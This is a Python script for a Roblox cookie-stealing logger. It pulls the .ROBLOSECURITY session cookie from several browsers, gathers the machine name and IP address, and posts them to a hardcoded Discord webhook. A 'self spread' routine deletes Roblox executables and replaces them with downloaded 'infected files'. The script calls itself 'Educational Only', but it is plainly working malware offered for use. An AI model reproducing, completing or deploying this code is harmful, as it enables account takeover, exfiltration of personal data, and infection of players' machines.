import browser_cookie3, requests, urllib, re, os

#   Settings - Webhook    #
webhook = 'https://discord.com/api/webhooks/1485692385928413194/d8eEJbLKw5uduwT7CX9th4fNypOG7NVZNESf_WoMXjsplrtBl5Xl9jV-eoj-5xkqkKwZ'
avatarUrl = 'https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fimages-wixmp-ed30a86b8c4ca887773594c2.wixmp.com%2Ff%2Fe35656ff-9190-4f2d-85c0-0cd74a1c2ee8%2Fdfdzlg1-8abe77e7-3d13-49fd-b290-fe6d28212a23.png%2Fv1%2Ffill%2Fw_894%2Ch_894%2Cq_70%2Cstrp%2Fcookie_monster_creep_by_taggedzi_dfdzlg1-pre.jpg%3Ftoken%3DeyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9MTAyNCIsInBhdGgiOiJcL2ZcL2UzNTY1NmZmLTkxOTAtNGYyZC04NWMwLTBjZDc0YTFjMmVlOFwvZGZkemxnMS04YWJlNzdlNy0zZDEzLTQ5ZmQtYjI5MC1mZTZkMjgyMTJhMjMucG5nIiwid2lkdGgiOiI8PTEwMjQifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6aW1hZ2Uub3BlcmF0aW9ucyJdfQ.7mXOjCpjSWK4F4Cnn3JJ8LXuxpVD164v_nIEAZ4BUCs&f=1&nofb=1&ipt=4a181f86f4429c6f7a3dcc3773a874c69d9e5f566c1d18ce257b5b2c6244c9cc'
botName = 'aiehaieeheiheeih | ROBLOX'
#   Settings - Self Spread    #

#   Functions   #
def sendWebhook(message):
    requests.post(webhook, data = f'username={botName}&avatar_url={avatarUrl}&content={message}', headers = {'content-type':"application/x-www-form-urlencoded"})

def scrapeInfo(cookies):
    request = requests.get('https://www.roblox.com', cookies=cookies)
    displayName = re.findall("displayname=(.*) data-isunder13", request.content.decode('UTF-8'))
    return displayName[0]

def getIPAddress():
    request = requests.get('https://ip4.seeip.org/')
    return request.content.decode('UTF-8')

def downloadFile(downloadFile, path):
    urllib.request.urlretrieve(downloadFile, path)

def selfSpread():
    path = os.getenv('LOCALAPPDATA') + '\\Roblox\\Versions'
    if os.path.isdir(path):
        for file in os.listdir(path):       # For every file in "Appdata/Local/Roblox/Versions"
                if os.path.isdir(path + f'\\{file}'):       # If a path is directory
                    path += f'\\{file}'     # Adding the directory to the path
                    for file in os.listdir(path):       # For every file in the new directory
                        if file.endswith('.exe'):       # If file ends with .exe
                            if os.path.getsize(path + '\\RobloxPlayerLauncher.exe') < 5242880 or os.path.getsize(path + '\\RobloxPlayerBeta.exe') > 31457280: # 5242880 -> 5MB, 31457280 -> 30MB
                                exePath = path + f'\\{file}'        # Adding the file to the path
                                os.remove(exePath)      # Removing the file
                                downloadFile(fileLink, exePath)       # Downloading the infected files // When opening Roblox it'll open the infected file.
                else:
                    continue

def cookieLogger():

    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

def AtomLogger():
    cookies = cookieLogger()

    machineName = os.getenv('COMPUTERNAME')

    message = '```' + 'AtomLogger | Educational Only\n'
    message += f'\nName: {scrapeInfo(cookies[0])} \nCookie:\n{cookies[1]} \n\nMachine Name: {machineName} \nIP Address: {getIPAddress()}' + '```'
    sendWebhook(message)


if __name__ == '__main__':
    AtomLogger()
    selfSpread()
